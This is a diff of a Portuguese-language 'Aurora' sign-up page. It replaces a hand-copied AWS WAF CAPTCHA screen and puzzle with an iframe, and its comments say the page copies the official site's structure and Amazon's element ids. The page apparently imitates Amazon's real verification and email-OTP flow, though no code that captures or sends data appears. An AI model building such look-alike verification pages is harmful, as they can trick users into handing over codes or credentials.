@@ -165,46 +165,10 @@
         <p class="legal">Ao criar uma conta, você concorda com os <a href="#">Termos de Uso</a> e o <a href="#">Aviso de Privacidade</a> da Aurora.</p>
       </section>
 
-      <!-- ===== STEP 4: AWS WAF CAPTCHA "home" screen — literal structure ===== -->
-      <section class="card hidden" data-screen="4">
-        <div class="sc-99cwso-0 sc-11w6f91-0 fcBZbp eWRcSj home box screen">
-          <h2 font-size="1.5" tabindex="-1" data-theme="home.title" class="sc-1io4bok-0 gdVRUf heading text">Protecting your account</h2>
-          <p tabindex="-1" data-theme="home.instructions" class="sc-1io4bok-0 KalLU sc-d5trka-0 text">Please solve this puzzle so we know you are a real person</p>
-          <button aria-label="Start Puzzle" aria-description="Visual challenge. Audio challenge is available below, compatible with screen reader software." class="sc-nkuzb1-0 sc-d5trka-0 eZxMRy button" data-theme="home.verifyButton">Start Puzzle</button>
-        </div>
-      </section>
-
-      <!-- ===== STEP 5: captcha challenge ===== -->
-      <section class="card hidden center-card" data-screen="5">
-        <h1 class="h1-center">Resolva o quebra-cabeça para proteger sua conta</h1>
-        <p class="sub center">Use as setas para mover o ícone até a órbita indicada. (1 de 1)</p>
-        <div class="captcha-stage">
-          <div class="captcha-target">
-            <span class="target-num" id="target-num">17</span>
-            <span class="target-icon" id="target-icon">🏆</span>
-            <span class="target-tag">Combine este!</span>
-          </div>
-          <div class="captcha-orbit" id="captcha-orbit">
-            <div class="orbit-ring" data-ring="0"></div>
-            <div class="orbit-ring" data-ring="1"></div>
-            <div class="orbit-ring" data-ring="2"></div>
-            <div class="orbit-icon" id="orbit-icon">🏆</div>
-            <button type="button" class="orbit-arrow left" id="orbit-left" aria-label="Esquerda">←</button>
-            <button type="button" class="orbit-arrow right" id="orbit-right" aria-label="Direita">→</button>
-          </div>
-        </div>
-        <p class="error center" id="err-captcha"></p>
-        <span class="a-button a-button-primary" id="amzn-btn-verify-internal">
-          <span class="a-button-inner">
-            <input class="a-button-input" type="button" aria-labelledby="amzn-btn-verify-internal-announce" />
-            <span class="a-button-text" id="amzn-btn-verify-internal-announce" aria-hidden="true">Enviar</span>
-          </span>
-        </span>
-        <div class="icon-row">
-          <button type="button" class="icon-btn" aria-label="Áudio">🔊</button>
-          <button type="button" class="icon-btn" id="amzn-captcha-refresh-button" aria-label="Recarregar">↻</button>
-        </div>
-        <p class="alt-left"><a href="#">Precisa de ajuda?</a></p>
+      <!-- ===== STEP 4: AWS WAF CAPTCHA hosted in an iframe (like the official site) ===== -->
+      <section class="card hidden center-card" data-screen="4">
+        <iframe id="aws-waf-captcha" title="AWS WAF Captcha" name="aws-waf-captcha"
+                src="captcha.html" class="captcha-frame" scrolling="no"></iframe>
       </section>
 
       <!-- ===== STEP 6: verify email OTP (Amazon CVF) ===== -->
